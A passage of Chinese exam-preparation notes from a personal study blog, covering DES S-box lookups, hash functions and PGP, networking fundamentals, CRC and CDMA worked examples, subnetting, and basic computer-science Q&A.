class="line">S4(111001)=S4(11,1100)=S4(3,12)=12=1100</span><br></pre></td></tr></table></figure><hr><p>求S5，S5输入：000101</p><p><img src="/images/crypto/DES5.png"></p><p>1.取输入数据头尾：01（二进制）——&gt; 1（十进制）  1行</p><p>2.取输入数据中间：0010（二进制）——&gt; 2（十进制）2列</p><p>根据1 2步取出的坐标值(1，2)，找到对应的数据为2</p><p>3.将值2转化为二进制=10，S5输出结果为10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S5(000101)=S5(01,0010)=S5(1,2)=2=0010</span><br></pre></td></tr></table></figure><p>综上计算结果：S1输出结果为1100，S2输出结果为0000，S3输出结果为1001，S4输出结果为1100，S5输出结果为0010</p><hr><h3 id="MD5-信息摘要算法-消息鉴别"><a href="#MD5-信息摘要算法-消息鉴别" class="headerlink" title="MD5-信息摘要算法-消息鉴别"></a>MD5-信息摘要算法-消息鉴别</h3><p>MD5-信息摘要算法-消息鉴别—&gt;理解为身份认证</p><p><strong>MD5信息摘要算法</strong>（英语：MD5 Message-Digest Algorithm）消息摘要算法</p><p>不是加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MD5算法的原理可简要的叙述为：MD5码以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，</span><br><span class="line">经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值</span><br></pre></td></tr></table></figure><p>MD5算法的原理可简要的叙述为：MD5码以<font color="ff0000">512位分组</font>来处理输入的信息，且每一分组又被划分为<font color="ff0000">16个32位子分组</font>，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将<font color="ff0000">生成一个128位</font>散列值</p><h3 id="SHA-安全散列算法-数字签名"><a href="#SHA-安全散列算法-数字签名" class="headerlink" title="SHA-安全散列算法-数字签名"></a>SHA-安全散列算法-数字签名</h3><p><strong>安全散列算法</strong>（英语：Secure Hash Algorithm，缩写为SHA）</p><p>不是加密</p><p><code>SHA是公认的最安全的散列算法之一</code></p><p><code>加密后的字符串位数固定</code></p><p><code>SHA的算法安全性比MD5要高</code></p><h3 id="PGP-优良保密协议"><a href="#PGP-优良保密协议" class="headerlink" title="PGP-优良保密协议"></a>PGP-优良保密协议</h3><p><strong>PGP</strong>（英语：Pretty Good Privacy，中文翻译“优良保密协议”）</p><p>将公开密钥加密（非对称加密）与传统加密（对称加密）相结合的一种加密技术</p><p>非对称：加密与解密密钥不同（公钥加密、私钥解密）</p><p>对称：加密与解密共用一个密钥</p><p><strong>主要功能：</strong></p><p>PGP主要功能是加密重要文件和电子邮件，以保证他们在网络上安全传输，或者为文件数字签名，以防止伪造和篡改。主要包括：</p><p>​    1.使用对称加密算法IDEA对存储在计算机上的文件加密。</p><p>​    2.使用公开密钥加密技术对电子邮件进行加密</p><p>​    3.使用公开密钥加密技术对文件或电子邮件做数字签名</p><p>​    4.管理密钥。为用户配置密钥、分发密钥</p><hr><h2 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h2><h3 id="IP地址分类"><a href="#IP地址分类" class="headerlink" title="IP地址分类"></a>IP地址分类</h3><p>私有地址地址分类</p><p>A类地址：10.0.0.0～10.255.255.255<br>B类地址：172.16.0.0～172.31.255.255<br>C类地址：192.168.0.0～192.168.255.255</p><p>所有地址分类</p><p><img src="/images/crypto/IP-0.png"></p><p><img src="/images/crypto/IP.png"></p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><strong>计算机网络的定义：</strong></p><p>把分布在不同地点且具有独立功能的多个<font color="ff0000">计算机系统</font>通过<font color="ff0000">通信设备</font>和<font color="ff0000">线路</font>连接起来，在功能完善的软件和协议的管理下<font color="ff0000">实现网络中资源共享</font>系统。</p><p>扩展：</p><p>​    1.计算机网络是<strong>通信技术</strong>与<strong>计算机技术</strong>的结合产物</p><p>​    2.数据交换是基础，资源交换是目的。</p><p><strong>多路复用</strong></p><p>XDM XXDM   XDMX   都是多路复用 DM</p><p>1.减少远距离通信时的线路开支</p><p>2.降低信号通信时的线路带宽的浪费</p><p>3.将多路信号在单一的传输线路上同时传输</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">频分多路复用：FDM</span><br><span class="line">时分多路复用：TDM</span><br><span class="line">STDM：同步时分多路复用    所有的分段时间片都是固定的，固定分配</span><br><span class="line">ATDM：异步时分多路复用    用的多 分配时间片多，动态分配</span><br><span class="line">空分多路复用：SDM   根据传输介质的线缆多少绝对速度，例如：一个网线内部8条线比4条要快</span><br><span class="line">波分多路复用：WDM   光波</span><br><span class="line"></span><br><span class="line">CDM 码分多路复用 ！！！</span><br><span class="line">CDMA 码分多址</span><br><span class="line">实例：</span><br><span class="line">ATM 异步传输模式，ehernet、以太网。使用异步时分多路复用技术   信元-53字节</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h3 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h3><p>1.计算机网络由两大部分组成，分别是<strong>资源子网</strong>和<strong>通信子网</strong></p><p>2.计算机网络分类：</p><p>​    作用范围可分为：局域网、广域网、城域网、个域网(Pan)</p><p>​    按照拓扑结构分类：星型网络、环型网络、总线型网络</p><p>​    按照交换方式分类：电路交换网、报文交换网、分组交换网</p><p>3.数字传输就是在信道上通过<strong>数字信号</strong>传输数据，<strong>应用于局域网</strong>传输，编码方式为<strong>曼彻斯特编码</strong></p><p>4.在线路的接收端，通过<strong>解调器</strong>将收到的模拟信号解调还原为数字信号，整个过程利用<strong>调制解调器</strong></p><p>5.网络层提供了<strong>虚电路</strong>和<strong>数据报</strong>两种网络服务。    虚电路与数据报一起出现</p><p>6.分组交换采用<strong>存储转发</strong>技术，避免了电路交换的<strong>占线</strong>缺点</p><p>7.用于<u>异构网</u>洛互联的网间连接器是<strong>网关</strong>。  异构网络：两端网络结构不同</p><p>8.域名：.gov 政府 , .com 商业 .edu教育  .org非商业</p><p>9.内部网关协议：RIP OSPF EIGRP，外部网关协议：BGP-边界网关协议-连接不同的自治系统</p><p>10.邮件协议：</p><p>​    接收：POP 110       IMAP</p><p>​    发送：SMTP （MIME协议(通用因特网邮件扩充)，用于弥补SMTP的不足。<font color="ff0000" >MIME不负责发送</font>）</p><p>11.CDMA(码分多址)采用的复用技术是：码分复用。   码分多址是码分复用的具体应用</p><p>12.公用数据网是一种：通信子网</p><p>13.通信子网的主要组成是：网络节点和通信链路</p><p>14.网络协议的三个要素：<strong>语法、语义和时序</strong></p><p>15.决定局域网新跟那个的主要技术要素：<strong>网络拓扑、传输介质、介质访问控制方式</strong></p><p>16.线路通信方式</p><p>​        1.单工通信    ：<strong>只有一个方向的通信</strong>而没有反方向的交互。例：广播，有线电视</p><p>​        2.半双工通信：通信的双方都可以发送消息，但<strong>不能同时</strong>发送(也不能同时接收)，一方发送，另一方接收，过一段时间反过来。</p><p>​        3.全双工通信：双方都可以<strong>同时</strong>发送和接收信息。</p><p>17.数字数据的<strong>模拟信号</strong>编码分为三种方式：调幅（ASK）、调频（FSK）、调相（PSK）</p><p>18.数字数据的<strong>数字信号</strong>编码分为三种方式：不归零码、曼彻斯特编码、差分曼彻斯特编码</p><p>19.<strong>模拟</strong>数据的<strong>数字</strong>信号编码，使用PCM(脉冲编码调制)：</p><p>​        发送端分为三个步骤：<strong>1.采样，2.量化，3.编码</strong></p><p>​        接收端线要经过D/A转换，再经过低通滤波器还原成模拟</p><p>下方是数字信号和模拟信号分别在数字信道和模拟信道上传输用到的技术↓↓↓</p><p><img src="/images/crypto/%E4%BF%A1%E5%8F%B7.png"></p><p>20.网际层协议包括：IP、ICMP、IGMP、ARP、RARP</p><p>21.邮件传输问题如下图，左侧上传，右侧下载。MIME是类似于插件的东西</p><p><img src="/images/crypto/email.png"></p><p>22.网络层包含的功能：路由选择、流量控制(滑动窗口、停等协议(ACK,NAK))、拥塞控制</p><p>23.差错控制：向前纠错(数据链路层)(举例:海明码)、反馈重传(停等、回退N帧(检错码,举例：奇偶校验、CRC)、选择重传)</p><p><img src="/images/crypto/001.png"></p><p>24.计算机资源共享的包括：硬件、软件、‘数据</p><p>协议的三要素：语法、语义、时序</p><p><img src="/images/crypto/002.png"></p><p>25.FDDI：光纤分布式数据接口</p><p>26.介质访问控制：CSMA/CD位于数据链路层的MAC子层(竞争型)   适用于总线型结构，阻塞信号。特点：监听再发、边听边发、冲突停止、延迟后再发；CSMA/CD会进行冲突检测功能</p><p>27.MAC帧最小64字节(数据位46-1500)，在存储转发时最少发送64字节；直接转发时最小14个字节</p><p>28.多模光纤：高贵细远</p><p>29.发送方与接收方必须以某种方式实现同步。        同步技术↓↓↓</p><p><img src="/images/crypto/%E5%90%8C%E6%AD%A5%E6%8A%80%E6%9C%AF.png"></p><p>30.<strong>香浓定理、奈奎斯特</strong></p><p>31.<strong>中继器</strong>具有完全再生网络中传送的原有物理信号的能力，工作在物理层</p><p>32.在网络中有线传输媒体主要包括：双绞线、同轴电缆(粗,细缆)、光纤</p><p>33.DDN的全称是 <strong>数字数据网</strong></p><p>34.传统以太网：10Mbps、快速LAN：100Mbps、千兆以太网：1000Mbps(半双工或全双工) 光纤、万兆：10G(只全双工) 光纤</p><p>35.交换机所有端口都独享总带宽，集线器所有端口均分带宽(总带宽/所有端口数(当前不用的也算))</p><p>36.<strong>网络层</strong>提供虚拟的、简单灵活的、无连接的、尽最大努力交付的、无质量保证的<strong>点对点服务</strong>；而<strong>传输层</strong>可以提供面向连接的、有序号确认的、有流量控制和拥塞控制的、有质量保证的<strong>端到端的服务</strong>。</p><p>37.中继器、集线器是物理层设备；交换机、网桥是数据链路层设备；网桥隔离冲突域；路由器隔离广播域</p><p>38.数据链路层的主要功能：差错控制、流量控制(滑动窗口)、提供对物理层的控制</p><p>网络层的主要功能：路由选择、流量控制、拥塞控制</p><p>39.使用半双工方式工作时要进行回路和冲突检测</p><p>40.调制解调器功能：基带处理、调制解调、信号放大、均衡</p><p>41.网络按通信方式分类：点对点传输网络、广播式传输网络</p><hr><h3 id="曼彻斯特编码与差分曼彻斯特编码"><a href="#曼彻斯特编码与差分曼彻斯特编码" class="headerlink" title="曼彻斯特编码与差分曼彻斯特编码"></a>曼彻斯特编码与差分曼彻斯特编码</h3><p>吴：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">曼彻斯特编码</span><br><span class="line">1：向上跳变</span><br><span class="line">0：向下跳变</span><br><span class="line">差分曼彻斯特编码</span><br><span class="line">1：无跳变</span><br><span class="line">0：有跳变</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>差分简易记法：无跳变就延长直着画，有跳变就上下拐弯画</p><p><img src="/images/crypto/%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81.png"></p><p><font color="ff0000">当未给定初始电平时，<strong>差分</strong>的起始电平默认与曼彻斯特相同</font></p><p>虚线可用铅笔或者草纸上画出，画完后应擦除掉虚线</p><p>曼彻斯特编码未连接的虚线处，在画完图后，将虚线全部擦除，连接处补上实线，连接成完整的图</p><h3 id="CRC循环冗余校验码"><a href="#CRC循环冗余校验码" class="headerlink" title="CRC循环冗余校验码"></a>CRC循环冗余校验码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">此类题两种出法，两种考法</span><br><span class="line">出题方法：</span><br><span class="line">1.给出二进制序列和F(X)，给出生成多项式G(X)=11001</span><br><span class="line">2.给出二进制序列和F(X)，给出生成多项式G(X)=X^5 + X^4 + X^2 + 1</span><br><span class="line">第一种形式直接进行二进制除计算即可，注意阶数为4</span><br><span class="line">第二种形式需要先转化为第一种形式</span><br><span class="line">转换方法：G(X)=X^5 + X^4 + X^2 + 1 = 1*X^5 + 1*X^4 + 0*X^3 + 1*X^2 + 0*X^1 +1*X^0 = 110101（也就是前面的系数）</span><br><span class="line">考法：</span><br><span class="line">1.求CRC校验码（二进制除最后的余数），长度等于阶数</span><br><span class="line">2.求(真正发送数据)CRC码（F(X)+二进制除余数）</span><br></pre></td></tr></table></figure><hr><h4 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h4><p>差错控制编码—检错码—CRC</p><p><img src="/images/crypto/CRC.png"></p><p>解题思路：</p><p>此题给的G(X)直接是多项式的系数11001</p><p><font color="ff0000">像此题已经给了G(X)系数，下方第一步可不写</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.还原多项式方法：G(X)=11001 = X^4 * 1 + X^3 * 1 + X^2 * 0 + X^1 * 0 + X^0 * 1</span><br><span class="line">  =X^4+X^3+1</span><br><span class="line">  由此，可以看出该多项式最高次系数=4，也就是多项式系数G(X)长度-1</span><br><span class="line"></span><br><span class="line">2.阶数=4，在F(X)二进制序列后补充 阶数个0</span><br><span class="line">3.使用第二部的结果去 ÷ 多项式系数G(X)——&gt;10010101100000 / 11001 ，进行二进制除，不进位，不借位</span><br><span class="line">0-0=0   1-1=0   0-1=1   1-0=1</span><br><span class="line">4.每次除掉5位，即G(X)长度，除后的结果高位0可省略，然后每次向下取，如果不满足五位就得一个0，满足五位得一个1</span><br><span class="line">5.最后计算出的余数，即为 CRC校验码,CRC校验码长度=阶数，不足则高位补0</span><br><span class="line">！！！如果式子刚好可以被整除，则CRC校验码为0000，因为阶数是4，所以4个0</span><br></pre></td></tr></table></figure><p><font color="ff0000">小技巧：阶数 = 循环冗余校验码位数 = 多项式最高次系数 = len(G(X))-1</font></p><p>下图是练习题的解题过程，</p><p><img src="/images/crypto/CRC1.png"></p><h4 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h4><p>这里是另一种情况，给出G(X)多项式，而不给系数的情况</p><p>题目：待发送的二进制序列F(X)为：111001001，生成多项式G(X)=X^5 + X^4 + X^2 + 1，求此待发送二进制序列的<font color="ff0000">CRC校验码</font>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.计算生成多项式系数</span><br><span class="line">G(X)=X^5 + X^4 + X^2 + 1 = 1*X^5 + 1*X^4 + 0*X^3 + 1*X^2 + 0*X^1 +1*X^0 = 110101（也就是前面的系数）</span><br><span class="line">得到生成多项式系数G(X)=110101</span><br><span class="line">2.计算阶数：阶数=G(X)长度-1 = 5，所以取阶=5</span><br><span class="line">3.在F(X)二进制序列末尾添加阶数个0，即为111001001 00000   这里为了区分加了空格，实际不用</span><br><span class="line">4.用第三步的F(X)二进制除G(X)  得到余数1010，CRC校验码为：01010</span><br><span class="line">到这里就已经解完了</span><br><span class="line">5.发送数据=F(X)+CRC校验码=111001001 01010   这里为了区分加了空格，实际不用</span><br></pre></td></tr></table></figure><p><img src="/images/crypto/CRC2.png"></p><h4 id="例题3"><a href="#例题3" class="headerlink" title="例题3"></a>例题3</h4><p>求接收方收到的数据=CRC码=待发送数据+CRC校验码</p><h4 id=""><a href="#" class="headerlink" title=""></a><img src="/images/crypto/CRC3.png"></h4><h4 id="例题4-发送数据"><a href="#例题4-发送数据" class="headerlink" title="例题4-发送数据"></a>例题4-发送数据</h4><p><img src="/images/crypto/CRC4.png"></p><h4 id="例题5-接收数据"><a href="#例题5-接收数据" class="headerlink" title="例题5-接收数据"></a>例题5-接收数据</h4><p>如果余数为0，则说明传输没有出错</p><p>那么在收到的二进制比特序列中去掉接CRC校验码(余数)后就能算出之前发送的数据是什么</p><p><img src="/images/crypto/CRC5.png"></p><h4 id="例题6"><a href="#例题6" class="headerlink" title="例题6"></a>例题6</h4><p>判断发送信息是否出错时，也是对多项式系数进行二进制除</p><p>第1题的余数1110刚好是4位，与阶数4相同，所以不用高位补零了</p><p>第2题<strong>余数不为0</strong>代表传输出错了</p><p><img src="/images/crypto/CRC6.png"></p><h4 id="例题7-求传送多项式T-X"><a href="#例题7-求传送多项式T-X" class="headerlink" title="例题7-求传送多项式T(X)"></a>例题7-求传送多项式T(X)</h4><p><img src="/images/crypto/CRC7.png"></p><h4 id="子网划分计算-1"><a href="#子网划分计算-1" class="headerlink" title="子网划分计算-1"></a>子网划分计算-1</h4><p>有分类地址计算 2^n-2      ABCDE类</p><p>无分类地址计算 2^n        /25，/26，/27…都叫做无分类地址</p><p><img src="/images/crypto/IP-1-1.png"></p><p><img src="/images/crypto/IP-1.png"></p><h4 id="子网划分2-A类地址"><a href="#子网划分2-A类地址" class="headerlink" title="子网划分2-A类地址"></a>子网划分2-A类地址</h4><p>题目要求：某公司有13.0.0.0的网段，要分配给6个部门,每个部门需要60台主机，请求出每个部门的网络地址、广播地址、可用IP范围和子网掩码。</p><p>答案：</p><p><img src="/images/crypto/IP-2.png"></p><p>子网掩码：</p><p>网络：8+3=11位</p><p>主机：24-3=21位</p><p>所以子网掩码为：11个1，21个0——&gt;255.224.0.0</p><p>解析：</p><p>为什么6个部门的计算部分要2^n-2呢？   因为是分类地址，全0全1不可用</p><h4 id="码分多址计算"><a href="#码分多址计算" class="headerlink" title="码分多址计算"></a>码分多址计算</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">已知：4个站的码片序列分别为：</span><br><span class="line">A:(-1 -1 -1 +1 +1 -1 +1 +1)</span><br><span class="line">B:(-1 -1 +1 -1 +1 +1 +1 -1)</span><br><span class="line">C:(-1 +1 -1 +1 +1 +1 -1 -1)</span><br><span class="line">D:(-1 +1 -1 -1 -1 -1 +1 -1)</span><br><span class="line">收到码片序列S：(-1 +1 -3 +1 -1 -3 +1 +1)</span><br><span class="line">问：哪个站发送数据了？发送的是0还是1？</span><br></pre></td></tr></table></figure><p>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">将站点与收到的码片序列S做规格化内积</span><br><span class="line">规格化内积：1/码片序列位数(8)*(A或B,C,D与S对应位置相乘结果再相加)</span><br><span class="line">三种计算结果如下：</span><br><span class="line">规格化内积为1：发送数据 -&gt; 1</span><br><span class="line">规格化内积为0：未发生数据</span><br><span class="line">规格化内积为-1：发送数据-&gt; 0</span><br></pre></td></tr></table></figure><p>计算：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">A站:</span><br><span class="line">1/8*((-1*1)+(-1*+1)+(-1*-3)+(+1*+1)+(+1*-1)+(-1*-3)+(+1*+1)+(+1*+1))=1</span><br><span class="line">S与A站规格化内积为1，所以A站发送数据了，发送数据是1</span><br><span class="line"></span><br><span class="line">B站:</span><br><span class="line">1/8*((-1*-1)+(-1*+1)+(+1*-3)+(-1*+1)+(+1*-1)+(+1*-3)+(+1*+1)+(-1*+1))=-1</span><br><span class="line">S与B站规格化内积为-1，B站发送了数据，发送了0</span><br><span class="line"></span><br><span class="line">C站:</span><br><span class="line">0</span><br><span class="line">S与C站规格化内积为0，C站未发送数据</span><br><span class="line"></span><br><span class="line">D站:</span><br><span class="line">1</span><br><span class="line">S与D站规格化内积为1，D站发送了数据，发送的是1</span><br></pre></td></tr></table></figure><hr><h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><p>信息安全的目标是保护信息的机密性、完整性、保密性、可用性、可控性</p><h2 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h2><p>计算机能处理的多媒体信息从时效性上又可分为两大类：静态媒体——包括文字、图形、图像；时变媒体——包括声音、动画、活动影像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">问：计算机的内存分为几种？每种的主要功能是什么</span><br><span class="line">答：分为RAM,ROM,CACHE</span><br><span class="line">ROM是只读存储器，不能写入信息，</span><br><span class="line">RAM是随机存储器，其中的信息具有易失性，关机断电易丢失</span><br><span class="line">CACHE是高速缓存，弥补了内存与CPU之间的速度差异</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">问：TCP/IP协议的含义是什么？TCP/IP参考模型分为那几层？</span><br><span class="line">答：TCP/IP含义是传输控制协议/网际协议，是internet的标准协议</span><br><span class="line">TCP/IP分为：链路接入层、网际层、传输层、应用层</span><br></pre></td></tr></table></figure><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><p>1、Alt+ PrintScreen：在使用Print Screen进行屏幕抓bai图时，同时按下Alt键，就会只抓取当前du活动窗口。</p><p>2、PrintScreen：对整个屏幕进行截图。</p><h3 id="计算机基础-选择-简答"><a href="#计算机基础-选择-简答" class="headerlink" title="计算机基础-选择+简答"></a>计算机基础-选择+简答</h3><h4 id="一、计算机概述"><a href="#一、计算机概述" class="headerlink" title="一、计算机概述"></a>一、计算机概述</h4><p>1.问：计算机的性能指标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">答：  以下三点</span><br><span class="line">1.CPU的快慢（速度、主频、周期）</span><br><span class="line">2.CPU的精度（1.字，2.字长）</span><br><span class="line">3.内存的容量（RAM）</span><br></pre></td></tr></table></figure><p>2.问：计算机的分类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">答：按照计算机性能分类，一共分为以下五类</span><br><span class="line">1.微机（单用户）</span><br><span class="line">2.小型机</span><br><span class="line">3.中型机</span><br><span class="line">4.大型机</span><br><span class="line">5.巨型机</span><br><span class="line">2-5均为多用户机器</span><br></pre></td></tr></table></figure><p>3.问：计算机发展史</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">答：考法有以下几种</span><br><span class="line">1.第一台计算机：1946年   美国   ENIAC  5000/秒</span><br><span class="line">2.按电子元件分类：4个时代</span><br><span class="line">1.第一代：电子管（1946-1958）</span><br><span class="line">2.第二代：晶体管（1958-1964）</span><br><span class="line">3.第三代：集成电路或小规模集成电路（1964-1971）</span><br><span class="line">4.第四代：大规模或超大规模集成电路（1971-至今）</span><br><span class="line">81年才有PC机(微机)</span><br></pre></td></tr></table></figure><p>4.问：计算机的特点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">答：</span><br><span class="line">1.速度快</span><br><span class="line">2.精度高</span><br><span class="line">3.容量大（记忆判断、逻辑判断）</span><br><span class="line">4.程序控制自动完成</span><br><span class="line">5.可靠性强</span><br><span class="line">6.通用性强</span><br><span class="line"></span><br><span class="line">突出特点：</span><br><span class="line">存储和程序控制</span><br></pre></td></tr></table></figure><p>5.问：计算机的应用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">答：</span><br><span class="line">1.科学计算</span><br><span class="line">2.数据处理</span><br><span class="line">3.过程控制</span><br><span class="line">4.人工智能</span><br><span class="line">5.信息高速公路（网络化）</span><br><span class="line">6.计算机辅助功能</span><br><span class="line">CAD 计算机辅助设计</span><br><span class="line">CAM 计算机辅助制造</span><br><span class="line">CAI 计算机辅助教学</span><br><span class="line">CAT 计算机辅助测试</span><br></pre></td></tr></table></figure><p><strong>6.计算机系统的组成（重点）</strong></p><p>计算机系统由硬件和软件组成，主要考察硬件如下</p><p><img src="/images/crypto/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90.png"></p><p>第二种考法，计算机的五大组成：<strong>运算器、控制器、存储器、输入设备、输出设备</strong></p><p><img src="/images/crypto/%E7%B3%BB%E7%BB%9F%E8%BD%AF%E4%BB%B6%E5%88%86%E7%B1%BB.png"></p><p>7.问：计算机内部采用二进制的优点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.实现简单，运算规则简单</span><br><span class="line">2.适合逻辑处理</span><br></pre></td></tr></table></figure><p>8.问：位、字节、字、字长的含义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">答：</span><br><span class="line">1.位（bit）  数据(计算机用)和信息(人用)的最小单位</span><br><span class="line">2.字节（Byte）  存储器容量最小单位   1B=8bit</span><br><span class="line">3.字（word）  计算机内部数据存储、数据处理的最小单位</span><br><span class="line">4.字长        字的长度       1字= ? bit   ?不是固定值</span><br></pre></td></tr></table></figure><p>9.问：汉字编码的内容</p><p><a href="https://zhidao.baidu.com/question/1836307276288071620.html">https://zhidao.baidu.com/question/1836307276288071620.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">答：</span><br><span class="line">1.键盘-&gt;外码（输入码）</span><br><span class="line">2.内存-&gt;国际码或BCD码（转换）、 机内码（存储） -&gt;大小2Byte</span><br><span class="line">3.屏幕-&gt;字形码（输出码）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/crypto/%E6%B1%89%E5%AD%97%E7%BC%96%E7%A0%81.png"></p><h4 id="二、网络、病毒及多媒体计算机"><a href="#二、网络、病毒及多媒体计算机" class="headerlink" title="二、网络、病毒及多媒体计算机"></a>二、网络、病毒及多媒体计算机</h4><p>1.网络定义</p><p><img src="/images/crypto/%E7%BD%91%E7%BB%9C%E7%BB%84%E6%88%90.png"></p><p>2.OSI协议、TCP/IP协议及结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">OSI/RM   开放式系统互联模型     网络技术标准协议</span><br><span class="line">7层结构</span><br><span class="line">TCP/IP   传输控制协议/网间协议  internet专用协议</span><br><span class="line">4层结构 </span><br></pre></td></tr></table></figure><p>3.网络分类及功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.按照网络规模分类(覆盖范围)</span><br><span class="line">局域网 LAN   &lt;10km</span><br><span class="line">城域网 MAN   10-100km</span><br><span class="line">广域网 WAN   &gt;100km</span><br><span class="line">2.按照网络功能分类</span><br><span class="line">资源共享（硬件、软件、数据）</span><br><span class="line">数据传输</span><br><span class="line">数据分布处理</span><br><span class="line">综合信息服务</span><br><span class="line">  前两个是主要功能</span><br></pre></td></tr></table></figure><p>4.<strong>internet的组成（重点）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.主机</span><br><span 